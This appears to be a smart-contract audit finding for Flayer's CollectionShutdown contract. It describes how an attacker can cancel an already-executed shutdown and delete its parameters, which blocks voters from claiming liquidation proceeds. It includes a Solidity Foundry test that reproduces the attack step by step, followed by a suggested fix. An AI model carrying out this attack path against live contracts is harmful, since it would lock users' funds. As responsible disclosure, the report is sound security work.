# Voters will be blocked from claiming liquidation share

### Summary

After the shutdown is executed, an attacker can brick the shutdown parameters (by voting and creating new collection token) to successfully cancel the shutdown. This will delete all shutdown parameters and block voters from claiming liquidation share.

### Root Cause

- The function `CollectionShutdown#cancel()` [requires that the shutdown is `canExecute`](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/utils/CollectionShutdown.sol#L393).
- However, even after it is executed, an user can still votes and [change the flag `canExecute` to true](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/utils/CollectionShutdown.sol#L208-L211)
- The function `CollectionShutdown#cancel()` can be executed if [`params.collectionToken.totalSupply >= MAX_SHUTDOWN_TOKENS * 10 ** locker.collectionToken(_collection).denomination()`](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/utils/CollectionShutdown.sol#L398), which means that the total supply of the **delisted** (delisted from `Locker`) collection token is higher than the **current** collection token for that `_collection`
- The function `CollectionShutdown#cancel()` will [delete the collection shutdown parameters](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/utils/CollectionShutdown.sol#L403), which will cause the function `CollectionShutdown#claim()` to [revert here](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/utils/CollectionShutdown.sol#L292). The same revert happens with function [`voteAndClaim()`](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/utils/CollectionShutdown.sol#L326)

### Internal pre-conditions

1. An user calls `CollectionShutdown#start()`
2. Users call `CollectionShutdown#vote()`
3. Quorum passes
4. Owner calls `CollectionShutdown#execute()`
5. The `Locker` contract will delist the collection, through the call at step 4

### External pre-conditions

_No response_

### Attack Path

1. After shutdown is executed, an attacker calls `CollectionShutdown#vote()`
2. Attacker calls `Locker#createCollection()` for the targeting collection address
3. Attacker calls `CollectionShutdown#cancel()`
4. Voters fail to call `CollectionShutdown#claim()`

### Impact

- Voters can not claim their liquidation share

### PoC

Update the test `test_CanExecuteShutdown` as below:

```solidity
    function test_CanExecuteShutdown() public withDistributedCollection {
        // Make a vote with our test user that holds `1 ether`, which will pass quorum
        collectionShutdown.vote(address(erc721b));

        // Confirm that we can now execute
        assertCanExecute(address(erc721b), true);

        // Mint NFTs into our collection {Locker}
        uint[] memory tokenIds = _mintTokensIntoCollection(erc721b, 3);

        // Process the execution as the owner
        collectionShutdown.execute(address(erc721b), tokenIds);

        // After we have executed, we should no longer have an execute flag
        assertCanExecute(address(erc721b), false);

        // Confirm that the {CollectionToken} has been sunset from our {Locker}
        assertEq(address(locker.collectionToken(address(erc721b))), address(0));

        // Confirm that our sweeper pool has been assigned
        ICollectionShutdown.CollectionShutdownParams memory shutdownParams = collectionShutdown.collectionParams(address(erc721b));
        assertEq(shutdownParams.sweeperPool, SUDOSWAP_POOL);

        // Ensure that `canExecute` has been set to `false`
        assertCanExecute(address(erc721b), false);

        // Confirm that our tokens are held by the sudoswap pool
        for (uint i; i < tokenIds.length; ++i) {
            assertEq(erc721b.ownerOf(tokenIds[i]), SUDOSWAP_POOL);
        }

        // Test that our price will decline in a linear manner
        (,,, uint inputAmount,,) = ILSSVMPair(shutdownParams.sweeperPool).getBuyNFTQuote(0, 1);
        assertEq(inputAmount, 500 ether + 2.5 ether);

        // After 1 day
        vm.warp(block.timestamp + 1 days);
        (,,, inputAmount,,) = ILSSVMPair(shutdownParams.sweeperPool).getBuyNFTQuote(0, 1);
        assertEq(inputAmount, 430.714285714285714286 ether);

        // After 7 days
        vm.warp(block.timestamp + 6 days);
        (,,, inputAmount,,) = ILSSVMPair(shutdownParams.sweeperPool).getBuyNFTQuote(0, 1);
        assertEq(inputAmount, 0);

        // Assume that attacker has Collection Token to vote
        vm.startPrank(address(locker));
        collectionToken.mint(address(this), 1 ether);
        vm.stopPrank();
        collectionShutdown.vote(address(erc721b));


        // Assume that attacker has at least 1 NFT
        erc721b.mint(address(this), 123);
        // attacker create collection token
        locker.createCollection(address(erc721b), "ASD", "ASD", 0);

        // attacker deposit to locker
        erc721b.approve(address(locker), 123);
        locker.deposit(address(erc721b), _tokenIdToArray(123), address(this));
        
        // call cancel to delete shutdown parameters
        collectionShutdown.cancel(address(erc721b));
        
        // Assume that NFTs on sudoswap liquidated 
        deal(shutdownParams.sweeperPool, 10 ether);
        vm.startPrank(shutdownParams.sweeperPool);
        address(collectionShutdown).call{value: 10 ether}('');
        vm.stopPrank();

        // Try to claim funds
        collectionShutdown.claim(address(erc721b), payable(address(this)));
    }
```

Run the test and console shows:
```bash
Ran 1 test for test/utils/CollectionShutdown.t.sol:CollectionShutdownTest
[FAIL. Reason: ShutdownNotExecuted()] test_CanExecuteShutdown() (gas: 2126131)
```

### Mitigation

- Update logic for function `cancel()` to prevent executed shutdown from cancellation
